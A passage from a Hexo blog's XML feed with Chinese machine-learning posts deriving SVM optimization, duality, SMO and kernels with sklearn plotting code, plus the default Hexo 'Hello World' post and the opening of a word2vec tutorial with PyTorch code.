src="https://www.zhihu.com/equation?tex=wx%2Bb%3D0" alt="[公式]" /> 就成了一个超平面。</p><p>为了使这个超平面更具<strong>鲁棒性</strong>，我们会去找最佳超平面，以最大间隔把两类样本分开的超平面，也称之为最大间隔超平面。</p><p><strong>支持向量</strong>：样本中距离超平面最近的一些点，这些点叫做支持向量。</p><p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902194615509-1318363853.jpg" alt="img" style="zoom:67%;float: center;" ></p><h2 id="svm最优化问题"><strong>SVM最优化问题</strong></h2><p>超平面表示方法 <span class="math display">\[w^{T} x+b=0\]</span> 扩展到 <span class="math inline">\(n\)</span> 维空间后，点 <span class="math inline">\(x=\left(x_{1}, x_{2} \ldots x_{n}\right)\)</span> 到直线 <span class="math inline">\(w^{T} x+b=0\)</span> 的距离为: <span class="math display">\[\frac{\left|w^{T} x+b\right|}{\|w\|}\]</span> 其中 <span class="math inline">\(\|w\|=\sqrt{w_{1}^{2}+\ldots w_{n}^{2}}\)</span></p><p>支持向量到超平面的距离为 d，其他点到超平面的距离大于 d。</p><p>于是有下列公式： <span class="math display">\[\begin{cases}\frac{w^{T} x+b}{\| w|| d} \geq 1 \quad y &amp; =1 \\ \frac{w^{T} x+b}{\|w\| d} \leq-1 &amp; y=-1\end{cases}\]</span> <span class="math inline">\(\|w\| d\)</span> 是正数, 我们暂且令它为 1 （之所以令它等于 1, 是为了方便推导和优化，且这样做对目 标函数的优化没有影响），故:</p><p><strong>注</strong>：个人觉得是因为这个超平面对于一定的数据集是确定的，w是常数，d也是常熟，只是未知而已，但是是确定的，就像高中导数经常用的x0，去掉对优化无影响。 <span class="math display">\[\left\{\begin{array}{l}w^{T} x+b \geq 1 \quad y=1 \\w^{T} x+b \leq-1 \quad y=-1\end{array}\right.\]</span> 将两个方程合并，我们可以简写为:</p><p><strong>注</strong>：还要加上y=1或-1的条件才行，参考中的这个有点问题 <span class="math display">\[y\left(w^{T} x+b\right) \geq 1\]</span> 至此我们就可以得到最大间隔超平面的上下两个超平面：</p><p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902201557948-1924338082.jpg" alt="img" style="zoom:67%;float: center;" /></p><p>每个支持向量到超平面的距离可以写为: <span class="math display">\[d=\frac{\left|w^{T} x+b\right|}{\|w\|}\]</span> 由上述 <span class="math inline">\(y\left(w^{T} x+b\right)&gt;1&gt;0\)</span> 可以得到 <span class="math inline">\(y\left(w^{T} x+b\right)=\left|w^{T} x+b\right|\)</span>, 所以我们得到: <span class="math display">\[d=\frac{y\left(w^{T} x+b\right)}{\|w\|}\]</span> 这里乘上 2 倍也是为了后面推导，对目标函数没有影响。刚刚我们得到支持向量 <span class="math inline">\(y\left(w^{T} x+b\right)=1\)</span>, 所以我们得到: <span class="math display">\[\max \frac{2}{\|w\|}\]</span> 再做一个转换: <span class="math display">\[\min \frac{1}{2}\|w\|\]</span> 为了方便计算（去除 <span class="math inline">\(\|w\|\)</span> 的根号），我们有: <span class="math display">\[\min \frac{1}{2}\|w\|^{2}\]</span> 所以得到的<strong>最优化问题</strong>是：s.t.是subject to 局限于,加上y=+1或-1 <span class="math display">\[\min \frac{1}{2}\|w\|^{2} s . t . \quad y_{i}\left(w^{T} x_{i}+b\right) \geq 1\]</span> 这是一个含有不等式约束的凸二次规划问题，可以对其使用拉格朗日乘子法得到其对偶问题（dual problem）。</p><h2 id="对偶问题">对偶问题</h2><h3 id="拉格朗日乘数法">拉格朗日乘数法</h3><p>就是微积分多元函数求极值那个</p><h4 id="等式约束优化问题">等式约束优化问题</h4><p><span class="math display">\[\min f\left(x_{1}, x_{2}, \ldots, x_{n}\right)\]</span> s.t. <span class="math inline">\(\quad h_{k}\left(x_{1}, x_{2}, \ldots, x_{n}\right)=0 \quad k=1,2, \ldots, l\)</span></p><p>我们令 <span class="math inline">\(L(x, \lambda)=f(x)+\sum_{k=1}^{l} \lambda_{k} h_{k}(x)\)</span>, 函数 <span class="math inline">\(L(x, y)\)</span> 称为 Lagrange 函数，参数 <span class="math inline">\(\lambda\)</span> 称 为 Lagrange 乘子没有非负要求。 利用必要条件找到可能的极值点: <span class="math display">\[\begin{cases}\frac{\partial L}{\partial x_{i}}=0 &amp; i=1,2, \ldots, n \\ \frac{\partial L}{\partial \lambda_{k}}=0 &amp; k=1,2, \ldots, l\end{cases}\]</span> 等式约束下的 Lagrange 乘数法引入了 <img src="https://www.zhihu.com/equation?tex=l" alt="[公式]" /> 个 Lagrange 乘子，我们将 <img src="https://www.zhihu.com/equation?tex=x_%7Bi%7D" alt="[公式]" /> 与 <img src="https://www.zhihu.com/equation?tex=%5Clambda_%7Bk%7D" alt="[公式]" /> 一视同仁，把 <img src="https://www.zhihu.com/equation?tex=%5Clambda_%7Bk%7D+" alt="[公式]" /> 也看作优化变量，共有 <img src="https://www.zhihu.com/equation?tex=%28n%2Bl%29" alt="[公式]" /> 个优化变量。</p><h4 id="不等式约束优化问题">不等式约束优化问题</h4><p>主要思想是将不等式约束条件转变为等式约束条件，引入<strong>松弛变量</strong>，将松弛变量也是为优化变量。</p><p>可以写为: <span class="math display">\[\begin{array}{ll}\underset{x}{\operatorname{minimize}} &amp; f(\boldsymbol{x}) \\\text { subject to } &amp; g_{i}(\boldsymbol{x}) \leq 0, i=1,2, \cdots, m\end{array}\]</span> 引入拉格朗日乘子 <span class="math inline">\(\left(\mu_{i} \geq 0\right)\)</span>, 定义上述问题的拉格朗日量 (Lagrangian) 如下 <span class="math display">\[L(x, \mu)=\left[f(x)+\sum_{i=1}^{m} \mu_{i} g_{i}(x)\right]\]</span> 同时定义拉格朗日对偶函数 (Lagrange dual function) 如下: <span class="math display">\[F(\mu)=i n f_{x} L(x, \mu)=i n f_{x}\left[f(x)+\sum_{i=1}^{m} \mu_{i} g_{i}(x)\right]\]</span> 一般情况下, <span class="math inline">\(L(x, \mu)\)</span> 是能取到最小值的, 所以 <span class="math inline">\(F(\mu)=\inf _{x} L(x, \mu)=\min _{x} L(x, \mu)\)</span> 求解。当强对偶性成立时, 通过KKT条件求解极值点, 然后从极值点挑出最值点。</p><p>求解。当强对偶性成立时，通过KKT条件求解极值点，然后从极值点挑出最值点。 <span class="math display">\[\left\{\begin{array}{l}\nabla f(x)+\sum_{i=1}^{m} \mu_{i} \nabla g_{i}(x)=0 \\g_{i}(x) \leq 0, \forall i=1, \cdots, m \\\mu_{i} \geq 0, \forall i=1, \cdots, m \\\mu_{i} g_{i}(x)=0, \forall j=1, \cdots, m\end{array}\right.\]</span> 第一个条件使得目标函数和约束函数的法向量共线（梯度共线）。 最后一个条件称为互补松弛条件(Complementary Slackness Condition)。通过引入这个条件, 增加了m个等式约束，使得等式的数量跟变量一样。</p><h3 id="强对偶性">强对偶性</h3><p>对偶问题其实就是将: <span class="math display">\[\begin{gathered}\min _{w} \max _{\lambda} L(w, \lambda) \\s . t . \quad \lambda_{i} \geq 0\end{gathered}\]</span> 变成了： <span class="math display">\[\begin{gathered}\max _{\lambda} \min _{w} L(w, \lambda) \\s . t . \quad \lambda_{i} \geq 0\end{gathered}\]</span> 类似于上面的倒数得到SVM最优化问题的表达式。</p><p>假设有个函数 <span class="math inline">\(f\)</span> 我们有: <span class="math display">\[\min \max f \geq \max \min f\]</span> 也就是说，最大的里面挑出来的最小的也要比最小的里面挑出来的最大的要大。这关系实际上就是 弱对偶关系，而强对偶关系是当等号成立时，即: <span class="math display">\[\min \max f=\max \min f\]</span> 如果 <span class="math inline">\(f\)</span> 是凸优化问题，强对偶性成立。</p><h2 id="svm优化过程">SVM优化过程</h2><p><strong>SVM优化公式</strong>： <span class="math display">\[\begin{aligned}  &amp;\quad \min _{w} \frac{1}{2}\|w\|^{2} \\       &amp;\text { s.t. } \quad g_{i}(w, b)=1-y_{i} \quad\left(w^{T} x_{i}+b\right) \leq 0, \quad i=1,2, \ldots, n\end{aligned}\]</span></p><h3 id="构造拉格朗日函数">构造拉格朗日函数</h3><p>微积分多元函数学的，忘得差不多了。。，就是用来求最大最小值的 <span class="math display">\[\begin{aligned}\min _{w, b} \max _{\lambda} L(w, b, \lambda)=&amp; \frac{1}{2}\|w\|^{2}+\sum_{i=1}^{n} \lambda_{i}\left[1-y_{i}\left(w^{T} x_{i}+b\right)\right] \\&amp; s . t . \quad \lambda_{i} \geq 0\end{aligned}\]</span></p><h3 id="利用强对偶性转化">利用强对偶性转化：</h3><p>利用强对偶性转化: <span class="math display">\[\max _{\lambda} \min _{w, b} L(w, b, \lambda)\]</span> 现对参数 <span class="math inline">\(\mathrm{w}\)</span> 和 <span class="math inline">\(\mathrm{b}\)</span> 求偏导数: <span class="math display">\[\begin{aligned}&amp;\frac{\partial L}{\partial w}=w-\sum_{i=1}^{n} \lambda_{i} x_{i} y_{i}=0 \\&amp;\frac{\partial L}{\partial b}=\sum_{i=1}^{n} \lambda_{i} y_{i}=0\end{aligned}\]</span> 得到: <span class="math display">\[\begin{aligned}\sum_{i=1}^{n} \lambda_{i} x_{i} y_{i} &amp;=w \\\sum_{i=1}^{n} \lambda_{i} y_{i} &amp;=0\end{aligned}\]</span> 我们将这个结果带回到函数中可得: <span class="math display">\[\begin{aligned}L(w, b, \lambda) &amp;=\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)+\sum_{i=1}^{n} \lambda_{i}-\sum_{i=1}^{n} \lambda_{i} y_{i}\left(\sum_{j=1}^{n} \lambda_{j} y_{j}\left(x_{i} \cdot x_{j}\right)+b\right) \\&amp;=\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)+\sum_{i=1}^{n} \lambda_{i}-\sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)-\sum_{i=1}^{n} \lambda_{i} y_{i} b \\&amp;=\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)\end{aligned}\]</span> 也就是说: <span class="math display">\[\min _{w, b} L(w, b, \lambda)=\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)\]</span> 去掉了w和b变量，得到只含有一个变量的式子，如下：</p><p><span class="math display">\[\begin{gathered}\max _{\lambda}\left[\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)\right] \\\text { s.t. } \sum_{i=1}^{n} \lambda_{i} y_{i}=0 \quad \lambda_{i} \geq 0\end{gathered}\]</span> 我们可以看出来这是一个二次规划问题，问题规模正比于训练样本数，我们常用 <strong>SMO(Sequential Minimal Optimization) 算法</strong>求解。</p><p><strong>SMO(Sequential Minimal Optimization)，序列最小优化算法</strong>，其核心思想非常简单：每次只优 化一个参数, 其他参数先固定住, 仅求当前这个优化参数的极值。我们来看一下 SMO 算法在 SVM 中的应用。 我们刚说了 SMO 算法每次只优化一个参数，但我们的优化目标有约束条件: <span class="math inline">\(\sum_{i=1}^{n} \lambda_{i} y_{i}=0\)</span>,</p><ol type="1"><li>选择两个需要更新的参数 <span class="math inline">\(\lambda_{i}\)</span> 和 <span class="math inline">\(\lambda_{j}\)</span>, 固定其他参数。于是我们有以下约束: 这样约束就变成了： <span class="math display">\[\lambda_{i} y_{i}+\lambda_{j} y_{j}=c \quad \lambda_{i} \geq 0, \lambda_{j} \geq 0\]</span> 其中 <span class="math inline">\(c=-\sum_{k \neq i, j} \lambda_{k} y_{k}\)</span>, 由此可以得出 <span class="math inline">\(\lambda_{j}=\frac{c-\lambda_{i} y_{i}}{y_{j}}\)</span>, 也就是说我们可以用 <span class="math inline">\(\lambda_{i}\)</span> 的表达 式代替 <span class="math inline">\(\lambda_{j}\)</span> 。这样就相当于把目标问题转化成了仅有一个约束条件的最优化问题, 仅有的约束是 <span class="math inline">\(\lambda_{i} \geq 0\)</span></li><li>对于仅有一个约束条件的最优化问题，我们完全可以在 <span class="math inline">\(\lambda_{i}\)</span> 上对优化目标求偏导, 令导数为 零, 从而求出变量值 <span class="math inline">\(\lambda_{i_{\text {new }}}\)</span>, 然后根据 <span class="math inline">\(\lambda_{i_{\text {new }}}\)</span> 求出 <span class="math inline">\(\lambda_{j_{\text {new }}}\)</span> 。</li><li>多次迭代直至收敛。 通过 <span class="math inline">\(\mathrm{SMO}\)</span> 求得最优解 <span class="math inline">\(\lambda^{*}\)</span> 。</li></ol><p>求偏导数时得到： <span class="math display">\[w=\sum_{i=1}^{m} \lambda_{i} y_{i} x_{i}\]</span> 由上式可求得 <span class="math inline">\(\mathrm{w}\)</span> 。 我们知道所有 <span class="math inline">\(\lambda_{i}&gt;0\)</span> 对应的点都是支持向量, 我们可以随便找个支持向量, 然后带入： <span class="math inline">\(y_{s}\left(w x_{s}+b\right)=1\)</span>, 求出 <span class="math inline">\(b\)</span> 即可, 两边同乘 <span class="math inline">\(y_{s}\)</span>, 得 <span class="math inline">\(y_{s}^{2}\left(w x_{s}+b\right)=y_{s}\)</span> 因为 <span class="math inline">\(y_{s}^{2}=1\)</span>, 所以: <span class="math inline">\(b=y_{s}-w x_{s}\)</span> 为了更具鲁棒性，我们可以求得支持向量的均值: <span class="math display">\[b=\frac{1}{|S|} \sum_{s \in S}\left(y_{s}-w x_{s}\right)\]</span> 步骤 <span class="math inline">\(5: \mathrm{w}\)</span> 和 <span class="math inline">\(\mathrm{b}\)</span> 都求出来了，我们就能构造出最大分割超平面： <span class="math inline">\(\boldsymbol{w}^{T} x+b=0\)</span> 分类决策函数： <span class="math inline">\(f(x)=\operatorname{sign}\left(w^{T} x+b\right)\)</span> 其中 <span class="math inline">\(\operatorname{sign}(\cdot)\)</span> 为阶跃函数： <span class="math display">\[\operatorname{sign}(x)=\left\{\begin{array}{rl}-1 &amp; x&lt;0 \\0 &amp; x=0 \\1 &amp; x&gt;0\end{array}\right.\]</span> 将新样本点导入到决策函数中既可得到样本的分类。</p><h2 id="核函数">核函数</h2><h4 id="问题">问题</h4><p>线性不可分问题：将二维线性不可分样本映射到高维空间中，让样本点在高维空间线性可分</p><p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902213653815-1203370718.jpg" alt="img" style="zoom:67%;" /></p><h4 id="核函数意义">核函数意义</h4><p>这是因为低维空间映射到高维空间后维度可能会很大，如果将全部样本的点乘全部计算好，这样的 <strong>计算量太大</strong>了。 但如果我们有这样的一核函数 <span class="math inline">\(k(x, y)=(\phi(x), \phi(y)), \quad x_{i}\)</span> 与 <span class="math inline">\(x_{j}\)</span> 在特征空间的内积等于 它们在原始样本空间中通过函数 <span class="math inline">\(k(x, y)\)</span> 计算的结果，我们就不需要计算高维甚至无穷维空间的 内积了。</p><p>举个例子：假设我们有一个多项式核函数: <span class="math display">\[k(x, y)=(x \cdot y+1)^{2}\]</span> 带进样本点的后： <span class="math display">\[k(x, y)=\left(\sum_{i=1}^{n}\left(x_{i} \cdot y_{i}\right)+1\right)^{2}\]</span> 而它的展开项是： <span class="math display">\[\sum_{i=1}^{n} x_{i}^{2} y_{i}^{2}+\sum_{i=2}^{n} \sum_{j=1}^{i-1}\left(\sqrt{2} x_{i} x_{j}\right)\left(\sqrt{2} y_{i} y_{j}\right)+\sum_{i=1} n\left(\sqrt{2} x_{i}\right)\left(\sqrt{2} y_{i}\right)+1\]</span> 如果没有核函数，我们则需要把向量映射成: <span class="math display">\[x^{\prime}=\left(x_{1}^{2}, \ldots, x_{n}^{2}, \ldots \sqrt{2} x_{1}, \ldots, \sqrt{2} x_{n}, 1\right)\]</span> 然后在进行内积计算, 才能与多项式核函数达到相同的效果。</p><h4 id="常见核函数">常见核函数</h4><p>线性核函数 <span class="math display">\[k\left(x_{i}, x_{j}\right)=x_{i}^{T} x_{j}\]</span> 多项式核函数 <span class="math display">\[k\left(x_{i}, x_{j}\right)=\left(x_{i}^{T} x_{j}\right)^{d}\]</span> 高斯核函数 <span class="math display">\[k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delta^{2}}\right)\]</span></p><h2 id="使用sklearn实现">使用sklearn实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> svm</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">0</span>) <span class="comment"># 使用相同的seed()值，则每次生成的随即数都相同</span></span><br><span class="line"><span class="comment"># 创建可线性分类的数据集与结果集</span></span><br><span class="line">X = np.r_[np.random.randn(<span class="number">20</span>, <span class="number">2</span>) - [<span class="number">2</span>, <span class="number">2</span>], np.random.randn(<span class="number">20</span>,<span class="number">2</span>) + [<span class="number">2</span>, <span class="number">2</span>]]</span><br><span class="line">Y = [<span class="number">0</span>] * <span class="number">20</span> + [<span class="number">1</span>] * <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 SVM 模型</span></span><br><span class="line">clf = svm.SVC(kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">clf.fit(X, Y) <span class="comment"># 训练 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后就是收集这些数据来画平面图，因为这是一个二维的模型，因此可以假设超平面方程为 w0x + w1y + b = 0 转为点斜式就是: y = -(w0/w1)x - (b/w1) ：</span></span><br><span class="line">w = clf.coef_[<span class="number">0</span>]</span><br><span class="line">a = -w[<span class="number">0</span>] / w[<span class="number">1</span>] <span class="comment"># 斜率</span></span><br><span class="line">xx = np.linspace(-<span class="number">5</span>, <span class="number">5</span>) <span class="comment"># 在区间[-5, 5] 中产生连续的值，用于画线</span></span><br><span class="line">yy = a * xx - (clf.intercept_[<span class="number">0</span>]) / w[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">b = clf.support_vectors_[<span class="number">0</span>] <span class="comment"># 第一个分类的支持向量</span></span><br><span class="line">yy_down = a * xx + (b[<span class="number">1</span>] - a * b[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">b = clf.support_vectors_[-<span class="number">1</span>] <span class="comment"># 第二个分类中的支持向量</span></span><br><span class="line">yy_up = a * xx + (b[<span class="number">1</span>] - a * b[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pylab <span class="keyword">as</span> pl</span><br><span class="line"></span><br><span class="line">pl.plot(xx, yy, <span class="string">&#x27;k-&#x27;</span>)</span><br><span class="line">pl.plot(xx, yy_down, <span class="string">&#x27;k--&#x27;</span>)</span><br><span class="line">pl.plot(xx, yy_up, <span class="string">&#x27;k--&#x27;</span>)</span><br><span class="line">pl.scatter(clf.support_vectors_[:, <span class="number">0</span>], clf.support_vectors_[:, <span class="number">1</span>],</span><br><span class="line">           s=<span class="number">80</span>, facecolors=<span class="string">&#x27;none&#x27;</span>)</span><br><span class="line">pl.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=Y, cmap=pl.cm.Paired)</span><br><span class="line"></span><br><span class="line">pl.axis(<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">pl.show()</span><br></pre></td></tr></table></figure><h2 id="总结">总结</h2><h3 id="优点">优点</h3><ul><li>有严格的数学理论支持，可解释性强，不依靠统计方法，从而简化了通常的分类和回归问题；</li><li>能找出对任务至关重要的关键样本（即：支持向量）；</li><li>采用核技巧之后，可以处理非线性分类/回归任务；</li><li>最终决策函数只由少数的支持向量所确定，计算的复杂性取决于支持向量的数目，而不是样本空间的维数，这在某种意义上避免了“维数灾难”。</li></ul><h3 id="缺点">缺点</h3><ul><li>训练时间长。当采用 SMO 算法时，由于每次都需要挑选一对参数，因此时间复杂度为 <img src="https://www.zhihu.com/equation?tex=O%28N%5E2%29" alt="[公式]" /> ，其中 N 为训练样本的数量；</li><li>当采用核技巧时，如果需要存储核矩阵，则空间复杂度为 <img src="https://www.zhihu.com/equation?tex=O%28N%5E2%29" alt="[公式]" /> ；</li><li>模型预测时，预测时间与支持向量的个数成正比。当支持向量的数量较大时，预测计算复杂度较高。</li></ul><p>因此支持向量机目前只适合小批量样本的任务，无法适应百万甚至上亿样本的任务。</p><h2 id="参考">参考</h2><p>[1] <a href="https://zhuanlan.zhihu.com/p/77750026">【机器学习】支持向量机 SVM（非常详细） - 知乎 (zhihu.com)</a></p><p>[2] <a href="https://zhuanlan.zhihu.com/p/31886934">支持向量机（SVM）——原理篇 - 知乎 (zhihu.com)</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> machine_learning </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> model </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2021/10/17/hello-world.html"/>
+      <url>/2021/10/17/hello-world.html</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><meta name="referrer" content="no-referrer"/><h2 id="quick-start">Quick Start</h2><p><span class="math display">\[hello sdsd(\frac{a}{b})\]</span></p><p><img src="/images/hello-world/image-20211017201247881.png" /></p><h3 id="create-a-new-post">Create a new post</h3><p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211017194040110-1069279989.png" /></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> time </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Word2vec</title>
+      <link href="/2021/10/17/word2vec.html"/>
+      <url>/2021/10/17/word2vec.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>Word2Vec是语言模型中的一种，它是从大量文本预料中以无监督方式学习语义知识的模型，被广泛地应用于自然语言处理中。</p><p>Word2Vec是用来生成词向量的工具，而词向量与语言模型有着密切的关系。</p><span id="more"></span><meta name="referrer" content="no-referrer"/><h2 id="基础概念">基础概念</h2><h3 id="语料">语料</h3><p>看word2vec之前可以先看<a href="https://www.cnblogs.com/dddddblog/p/n_gram.html">n-gram模型</a></p><p>word2vec是一个统计语言模型，通过计算条件概率来预测和生成向量。</p><p>n-gram模型在语料库足够大的情况下，不单独统计各个条件概率，而是直接使用这种大概的方式，减少计算</p><p>​ <span class="math display">\[p(w_k|w_{k-n+1},...,w_{k-1}) = \frac{count(w_{k-n},...,w_k)}{count(w_{k-n+1},...w_{k-1})}\]</span></p><p>参数n（word2vec中的窗口大小）确定需要根据模型参数的数量来确定。一般来说越大越好，后面效果增加减少。</p><p>对于统计语言模型而言，利用最大似然，可把目标函数设为：</p><p><img src="https://www.zhihu.com/equation?tex=+%5Cprod_%7Bw+%5Cin+C%7D%5E%7B%7D+p%28w%7CContext%28w%29%29+%5C%5C" alt="[公式]" /> 其中，C表示语料(Corpus)，Context(w)表示词w的上下文，即w周边的词的集合。当Context(w)为空时，就取 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29%3D+p%28w%29" alt="[公式]" /> 。特别地，对于前面介绍的n-gram模型，就有 <img src="https://www.zhihu.com/equation?tex=Context%28w_%7Bi%7D+%3D+w_%7Bi-n%2B1%7D%2C...%2Cw_%7Bi-1%7D%29" alt="[公式]" /> 。</p><h3 id="模型基础">模型基础</h3><p>当然，实际应用中常采用最大对数似然，即把目标函数设为</p><p><img src="https://www.zhihu.com/equation?tex=L+%3D+%5Csum_%7Bw+%5Cin+C%7D%5E%7B%7D%7Blog+p%28w%7CContext%28w%29%29%7D++%5Ctag%7B4%7D%5C%5C" alt="[公式]" /> 然后对这个函数进行最大化。</p><p>从公式（4）可见，概率 <img src="https://www.zhihu.com/equation?tex=p%28w%7CContext%28w%29%29" alt="[公式]" /> 已被视为关于w和Context(w)的函数，即：</p><p><img src="https://www.zhihu.com/equation?tex=+p%28w%7CContext%28w%29%29+%3D+F%28w%2C+Context%28w%29%2C+%5Ctheta%29+%5C%5C" alt="[公式]" /> 其中 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 为待定参数集。这样一来，一旦对（4）进行优化得到最优参数集 <img src="https://www.zhihu.com/equation?tex=%5Ctheta%5E%7B+%2A%7D" alt="[公式]" /> 后，F也就唯一被确定了，以后任何概率p(w|Context(w))就可以通过函数 <img src="https://www.zhihu.com/equation?tex=F%28w%2C+Context%28w%29%2C+%5Ctheta%5E%7B+%2A%7D%29" alt="[公式]" /> 来计算了。与n-gram相比，这种方法不需要事先计算并保存所有的概率值，而是通过直接计算来获取，且通选取合适的模型可使得 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]" /> 中参数的个数远小于n-gram中模型参数的个数。</p><h2 id="word2vec网络结构">word2vec网络结构</h2><p>word2vec是轻量级的神经网络，其模型仅仅包括输入层、隐藏层和输出层，分为CBOW和Skip-gram模型。CBOW是知道上下文语料的情况下，预测当前的词。skip-gram则是根据一个词预测上下文。上下文是指根据window_size设置的前后各n个词。</p><p><img src="https://img2020.cnblogs.com/blog/2348945/202110/2348945-20211013225352657-2105331470.png" /></p><h3 id="cbow模型">CBOW模型</h3><p><img src="https://pic3.zhimg.com/80/v2-55eadeeae1fb93907d9b3da9aabed576_720w.jpg" /></p><h3 id="skip-gram模型">skip-gram模型</h3><p><img src="https://pic4.zhimg.com/80/v2-3baa8ea48cf7028510871a2894ffbb97_720w.jpg" /></p><h2 id="word2vec实践">word2vec实践</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> torch.autograd <span class="keyword">as</span> autograd</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CONTEXT_SIZE = <span class="number">2</span>  <span class="comment"># 2 words to the left, 2 to the right</span></span><br><span class="line">raw_text = <span class="string">&quot;&quot;&quot;We are about to study the idea of a computational process.</span></span><br><span class="line"><span class="string">Computational processes are abstract beings that inhabit computers.</span></span><br><span class="line"><span class="string">As they evolve, processes manipulate other abstract things called data.</span></span><br><span class="line"><span class="string">The evolution of a process is directed by a pattern of rules</span></span><br><span class="line"><span class="string">called a program. People create programs to direct processes. In effect,</span></span><br><span class="line"><span class="string">we conjure the spirits of the computer with our 